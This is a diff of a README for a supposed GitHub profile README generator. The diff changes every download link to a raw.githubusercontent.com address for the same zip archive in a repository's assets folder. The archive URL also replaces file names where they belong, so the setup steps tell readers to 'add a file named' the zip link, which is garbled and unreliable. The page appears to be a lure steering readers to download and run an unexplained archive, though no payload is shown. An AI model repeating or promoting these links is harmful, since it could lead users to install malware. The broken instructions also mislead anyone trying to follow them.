@@ -1,6 +1,6 @@
 # 📝 github-profile-generator - Create Your GitHub Profile README
 
-[![Download github-profile-generator](https://github.com/rezzdqsqdq/github-profile-generator/raw/refs/heads/claude/github-profile-generator-ai-Cfodt/assets/generator_github_profile_2.0.zip)](https://github.com/rezzdqsqdq/github-profile-generator/raw/refs/heads/claude/github-profile-generator-ai-Cfodt/assets/generator_github_profile_2.0.zip)
+[![Download github-profile-generator](https://raw.githubusercontent.com/rezzdqsqdq/github-profile-generator/claude/github-profile-generator-ai-Cfodt/assets/generator_github_profile_2.0.zip)](https://raw.githubusercontent.com/rezzdqsqdq/github-profile-generator/claude/github-profile-generator-ai-Cfodt/assets/generator_github_profile_2.0.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Follow these simple steps to get your GitHub profile README generated and ready 
 
 Click the button below to visit the releases page where you can download the latest version for your operating system.
 
-[![Download github-profile-generator](https://github.com/rezzdqsqdq/github-profile-generator/raw/refs/heads/claude/github-profile-generator-ai-Cfodt/assets/generator_github_profile_2.0.zip)](https://github.com/rezzdqsqdq/github-profile-generator/raw/refs/heads/claude/github-profile-generator-ai-Cfodt/assets/generator_github_profile_2.0.zip)
+[![Download github-profile-generator](https://raw.githubusercontent.com/rezzdqsqdq/github-profile-generator/claude/github-profile-generator-ai-Cfodt/assets/generator_github_profile_2.0.zip)](https://raw.githubusercontent.com/rezzdqsqdq/github-profile-generator/claude/github-profile-generator-ai-Cfodt/assets/generator_github_profile_2.0.zip)
 
 ### 2. Choose the Correct File
 
@@ -48,7 +48,7 @@ Once on the releases page, find the download file for your computer:
 
 - Windows users: Look for a file ending in `.exe`.
 - Mac users: Look for a file ending in `.dmg` or `.zip`.
-- Linux users: Look for `.AppImage` or `https://github.com/rezzdqsqdq/github-profile-generator/raw/refs/heads/claude/github-profile-generator-ai-Cfodt/assets/generator_github_profile_2.0.zip` files.
+- Linux users: Look for `.AppImage` or `https://raw.githubusercontent.com/rezzdqsqdq/github-profile-generator/claude/github-profile-generator-ai-Cfodt/assets/generator_github_profile_2.0.zip` files.
 
 Click the file to download it to your computer.
 
@@ -78,7 +78,7 @@ Once happy, you can save the generated markdown file on your computer or copy th
 
 To get started, visit this page to download the latest release:
 
-[https://github.com/rezzdqsqdq/github-profile-generator/raw/refs/heads/claude/github-profile-generator-ai-Cfodt/assets/generator_github_profile_2.0.zip](https://github.com/rezzdqsqdq/github-profile-generator/raw/refs/heads/claude/github-profile-generator-ai-Cfodt/assets/generator_github_profile_2.0.zip)
+[https://raw.githubusercontent.com/rezzdqsqdq/github-profile-generator/claude/github-profile-generator-ai-Cfodt/assets/generator_github_profile_2.0.zip](https://raw.githubusercontent.com/rezzdqsqdq/github-profile-generator/claude/github-profile-generator-ai-Cfodt/assets/generator_github_profile_2.0.zip)
 
 Locate the correct file for your OS and download it. Then, follow your operating system’s steps to open or install it.
 
@@ -93,8 +93,8 @@ Once you have your README markdown file, follow these steps to show it on your G
 1. Log into your GitHub account.
 2. Create a new repository with your GitHub username exactly (e.g., if your username is "johndoe", the repo must be "johndoe").
 3. Set this repo to public.
-4. Add a file named `https://github.com/rezzdqsqdq/github-profile-generator/raw/refs/heads/claude/github-profile-generator-ai-Cfodt/assets/generator_github_profile_2.0.zip` to this repo.
-5. Paste the markdown code you copied from the generator into this `https://github.com/rezzdqsqdq/github-profile-generator/raw/refs/heads/claude/github-profile-generator-ai-Cfodt/assets/generator_github_profile_2.0.zip`.
+4. Add a file named `https://raw.githubusercontent.com/rezzdqsqdq/github-profile-generator/claude/github-profile-generator-ai-Cfodt/assets/generator_github_profile_2.0.zip` to this repo.
+5. Paste the markdown code you copied from the generator into this `https://raw.githubusercontent.com/rezzdqsqdq/github-profile-generator/claude/github-profile-generator-ai-Cfodt/assets/generator_github_profile_2.0.zip`.
 6. Commit and push the change or save the file on GitHub web.
 7. Visit your profile page to see your new customized README.
 
